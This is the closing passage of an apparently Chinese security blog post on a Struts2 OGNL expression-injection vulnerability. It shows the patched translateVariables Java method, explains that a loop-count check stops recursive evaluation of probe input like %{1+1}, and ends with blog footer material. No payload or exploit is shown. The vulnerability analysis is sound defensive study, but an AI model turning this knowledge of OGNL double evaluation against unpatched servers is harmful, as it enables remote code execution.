<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="type">int</span> maxLoopCount)</span> &#123;</span><br><span class="line">    <span class="comment">// deal with the &quot;pure&quot; expressions first!</span></span><br><span class="line">    <span class="comment">//expression = expression.trim();</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line">    <span class="type">int</span> <span class="variable">loopCount</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>, pos);</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">middle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span></span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != <span class="literal">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  (middle != <span class="literal">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  <span class="number">1</span>;</span><br><span class="line">            pos = Math.max(pos, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中很明显多了一段代码，这里判断了循环的次数，从而在解析到<code>%&#123;1+1&#125;</code>的时候不会继续向下递归</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="IKwBa">总结</h2>
这个OGNL表达式解析的地方分析的我好头疼TvT


    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.jpg" alt="Sean 微信">
        <span>微信</span>
      </div>
      <div>
        <img src="/images/alipay.jpg" alt="Sean 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Struts2/" rel="tag"># Struts2</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/04/06/SnakeYaml%E9%93%BE/" rel="prev" title="SnakeYaml链">
                  <i class="fa fa-angle-left"></i> SnakeYaml链
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/04/16/Java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/" rel="next" title="Java回显技术">
                  Java回显技术 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Sean</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
